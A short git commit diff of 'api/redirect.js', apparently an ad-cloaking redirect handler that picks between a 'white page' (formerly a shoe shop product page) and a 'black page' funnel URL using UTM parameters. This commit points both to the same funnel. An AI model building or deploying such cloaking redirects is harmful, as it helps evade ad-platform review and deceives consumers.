821bc580a351e812fb649866c24aa98f35ad673b
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-01-20 17:07:15 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://anta.pk/collections/men-running-training-shoes/products/training-shoes";
-    const blackPageURL = "https://clbhwjqjwr.myfunnelish.com/imbassd-1736510997853577";
+    const whitePageURL = "https://clbhwjqjwr.myfunnelish.com/imbassd-1736979042571105-1737374461166822";
+    const blackPageURL = "https://clbhwjqjwr.myfunnelish.com/imbassd-1736979042571105-1737374461166822";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
